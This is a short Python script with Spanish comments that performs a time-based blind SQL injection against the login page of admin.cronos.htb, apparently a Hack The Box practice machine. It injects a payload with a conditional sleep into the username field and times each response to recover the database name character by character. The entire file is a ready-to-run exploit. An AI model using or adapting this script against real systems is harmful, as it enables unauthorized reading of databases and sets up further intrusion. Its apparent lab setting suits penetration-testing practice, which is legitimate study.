#!/usr/bin/python3
#coding utf-8

#Enumerar nombre de la BBDD

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdefghijklmnopqrstuvwxyz'

def makeRequest():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	p2 = log.progress("Database")	

	time.sleep(2)
	
	database = ""

	for position in range(1, 10):
		for character in s:
			p1.status("Probando con el caracter %c en la posiciÃ³n %d" % (character, position))
			post_data = {
				'username' : "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" %(position, character),
				'password' : 'admin'
			}
		
			time_start = time.time()
			r = requests.post(login_url, data=post_data)
			time_end = time.time()

			if time_end - time_start > 5:
				database += character
				p2.status(database)
				break

if __name__ == '__main__':

	makeRequest()
